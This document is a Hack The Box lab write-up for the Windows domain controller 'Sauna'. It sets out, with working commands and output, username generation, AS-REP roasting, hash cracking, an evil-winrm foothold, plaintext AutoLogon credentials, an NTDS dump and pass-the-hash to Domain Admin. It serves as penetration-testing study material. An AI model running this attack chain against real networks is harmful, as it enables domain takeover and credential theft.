# HTB — Sauna

**IP:** 10.129.95.180
**Domain:** EGOTISTICAL-BANK.LOCAL
**OS:** Windows Server 2019
**Difficulty:** Easy
**Status:** ✅ Complete

---

## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-27 08:22:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPinP)
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key indicators → Active Directory DC: ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 5985 (WinRM open = potential shell path).

---

## Web Enumeration → Employee Name Harvest

Visiting the site and browsing to the **About Us / Meet the Team** page reveals real employee names:

```
Fergus Smith
Hugo Bear
Shaun Coins
Steven Kerb
Sophie Driver
Bowie Taylor
```

No login forms or useful subpages found. Nothing else of value on the site.

---

## Username Generation

Whenever a site lists real employee names in an AD environment, generate a wordlist of common AD username formats.
See → [[AD_Username_Generation]] for the full methodology and script.

Generated `users.txt` covering common formats for each person (first, last, flast, first.last, first-last, lastfirst, etc.):

```
fergus
smith
fsmith
f.smith
f-smith
sfergus
shaun
coins
scoins
s.coins
s-coins
cshaun
hugo
bear
hbear
h.bear
h-bear
bhugo
bowie
taylor
btaylor
b.taylor
b-taylor
tbowie
sophie
sdriver
driver
s.driver
s-driver
dsophie
steven
kerb
skerb
s-kerb
s.kerb
ksteven
```

---

## /etc/hosts Fix (Required for Kerberos)

Kerberos authentication requires the domain to resolve by name, not just IP.
Without this, nxc LDAP -k throws `[Errno -2] Name or service not known`.

```bash
sudo nano /etc/hosts
```

Add:
```
10.129.95.180   EGOTISTICAL-BANK.LOCAL
```

---

## ASREPRoasting — Finding Vulnerable Accounts

Use `nxc ldap` with `-k` (Kerberos) and no password to probe which accounts have pre-authentication disabled.
An account with pre-auth disabled will respond to an AS-REQ without needing a password → AS-REP hash is returned.

```bash
netexec ldap 10.129.95.180 -u users.txt -p "" -k
```

Output:
```
[+] EGOTISTICAL-BANK.LOCAL\fsmith account vulnerable to asreproast attack
```

`fsmith` has pre-authentication disabled → ASREPRoastable.

---

## Extract the AS-REP Hash

```bash
netexec ldap 10.129.95.180 -u fsmith -p "" --asreproast asrep.txt
```

Hash captured → saved to `asrep.txt` / `fsmith.hash`:
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3682d05ce...29927
```

Hash type is `$krb5asrep$23$` → **Hashcat mode 18200** (Kerberos 5, etype 23, AS-REP).

---

## Crack the Hash

```bash
hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
```

Cracked:
```
fsmith : Thestrokes23
```

---

## Foothold — Evil-WinRM as fsmith

Port 5985 was open → WinRM accessible.

```bash
evil-winrm -u fsmith -p Thestrokes23 -i 10.129.95.180
```

Shell landed as `EGOTISTICALBANK\FSmith`.

---

## Post-Exploitation — winPEAS

Transfer and run winPEAS to enumerate privesc paths.

```powershell
upload winPEASany.exe
./winPEASany.exe
```

**Key finding — AutoLogon Credentials (plaintext in registry):**

```
DefaultDomainName  : EGOTISTICALBANK
DefaultUserName    : EGOTISTICALBANK\svc_loanmanager
DefaultPassword    : Moneymakestheworldgoround!
```

Windows AutoLogon stores credentials in plaintext under:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Note: the actual AD username is `svc_loanmgr` (not `svc_loanmanager` — the display name differs from the sAMAccountName).

See → [[winPEAS]] for more on what to look for in output.

---

## Lateral Movement — NTDS Dump via svc_loanmgr

`svc_loanmgr` had DCSync rights (likely via ACL). Use nxc to dump the NTDS:

```bash
netexec smb 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!' --ntds
```

> Note: single quotes needed here — the `!` breaks double-quoted strings in bash.

NTDS dump output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:...:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:...:9cb31797c39a9b170b04058ba2bba48c:::
```

NTDS format → `username:RID:LM_hash:NT_hash:::`
- The LM hash `aad3b435b51404eeaad3b435b51404ee` is just the empty LM hash — ignore it
- Administrator NT hash = `823452073d75b9d1cf70ebdf86c7f98e`

---

## Root — Pass-the-Hash as Administrator

```bash
evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.129.95.180
```

Domain Admin shell confirmed.

> Common mistake: passing the LM hash (`aad3b435b51404ee...`) instead of the NT hash — this always fails. `-H` wants the NT hash only.

---

## Attack Chain Summary

```
Web → Employee Names
  ↓
Username Generation (users.txt)
  ↓
nxc ldap -k → fsmith ASREPRoastable
  ↓
nxc ldap --asreproast → $krb5asrep$23$ hash
  ↓
hashcat -m 18200 → fsmith:Thestrokes23
  ↓
evil-winrm as fsmith
  ↓
winPEAS → AutoLogon plaintext → svc_loanmgr:Moneymakestheworldgoround!
  ↓
nxc smb --ntds → Administrator NT hash
  ↓
evil-winrm -H → Domain Admin
```

---

## Related Notes

- [[AD_Username_Generation]]
- [[Active_Directory_Attacks]]
- [[NetExec]]
- [[Hashcat]]
- [[winPEAS]]
- [[RDP_and_WinRM]]
